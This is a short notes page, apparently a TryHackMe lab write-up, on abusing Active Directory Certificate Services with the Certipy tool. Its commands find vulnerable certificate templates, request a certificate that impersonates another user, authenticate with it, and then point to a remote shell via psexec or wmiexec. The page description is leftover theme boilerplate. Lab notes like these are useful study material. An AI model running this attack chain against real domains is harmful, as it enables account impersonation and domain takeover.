---
layout: page
title: AD_CS_(Active_Directory_Certificate_Services)
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


https://github.com/ly4k/Certipy
https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage


```bash
certipy-ad find -u 'SUSANNA_MCKNIGHT@local.thm' -p 'CHANGEME2023!' -dc-ip $target -vulnerable
```

![Pasted_image_20250811231216.png](/image/Pasted_image_20250811231216.png)


```bash
certipy-ad -debug req -dc-ip $target -username 'SUSANNA_MCKNIGHT' -password 'CHANGEME2023!' -ca 'thm-LABYRINTH-CA' -target 'labyrinth.thm.local' -template 'ServerAuth' -upn 'BRADLEY_ORTIZ@THM.LOCAL'
```


```bash
certipy-ad -debug auth -pfx 'bradley_ortiz.pfx' -dc-ip $target
```


get shell with psexec(wmiexec) next


https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

